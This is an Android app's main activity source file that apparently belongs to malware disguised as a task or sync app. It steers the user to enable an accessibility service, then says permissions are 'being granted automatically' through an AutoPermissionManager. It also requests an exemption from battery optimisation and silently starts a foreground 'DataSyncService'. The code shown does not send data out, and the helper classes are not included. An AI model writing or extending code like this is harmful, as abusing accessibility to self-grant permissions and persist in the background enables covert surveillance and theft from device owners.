package com.task.tusker;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.services.DataSyncService;

public class MainActivity extends AppCompatActivity {

    private TextView statusText;
    private TextView statusTitle;
    private TextView statusDesc;
    private TextView statusIcon;
    private Button openAccessibilityBtn;

    private AutoPermissionManager permissionManager;
    private Handler pollHandler;
    private Runnable pollRunnable;
    private boolean accessibilityWasEnabled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        permissionManager = new AutoPermissionManager(this);

        statusText = findViewById(R.id.statusText);
        statusTitle = findViewById(R.id.statusTitle);
        statusDesc = findViewById(R.id.statusDesc);
        statusIcon = findViewById(R.id.statusIcon);
        openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);

        openAccessibilityBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        startDataSyncService();
        updateUiState();
        startPolling();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUiState();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopPolling();
    }

    private void updateUiState() {
        if (permissionManager.isAccessibilityServiceEnabled()) {
            showEnabledState();
        } else {
            showSetupState();
        }
    }

    private void showSetupState() {
        statusText.setText("Accessibility service not enabled");
        statusIcon.setText("⚠");
        statusTitle.setText("Action Required");
        statusDesc.setText("Enable the accessibility service to continue");
        openAccessibilityBtn.setText("Open Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
    }

    private void showEnabledState() {
        statusText.setText("Service active");
        statusIcon.setText("✓");
        statusTitle.setText("Accessibility Enabled");
        statusDesc.setText("Permissions are being granted automatically");
        openAccessibilityBtn.setText("Accessibility Settings");
    }

    private void startPolling() {
        pollHandler = new Handler();
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                boolean enabled = permissionManager.isAccessibilityServiceEnabled();
                if (enabled && !accessibilityWasEnabled) {
                    accessibilityWasEnabled = true;
                    showEnabledState();
                    requestRuntimePermissions();
                } else if (!enabled && accessibilityWasEnabled) {
                    accessibilityWasEnabled = false;
                    showSetupState();
                }
                if (pollHandler != null) {
                    pollHandler.postDelayed(this, 800);
                }
            }
        };
        pollHandler.post(pollRunnable);
    }

    private void stopPolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
        }
    }

    private void requestRuntimePermissions() {
        permissionManager.requestAllPermissions();

        new Handler().postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    android.os.PowerManager pm =
                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        Intent intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            android.net.Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    }
                } catch (Exception ignored) {}
            }
        }, 1500);
    }

    private void startDataSyncService() {
        try {
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception ignored) {}
    }
}
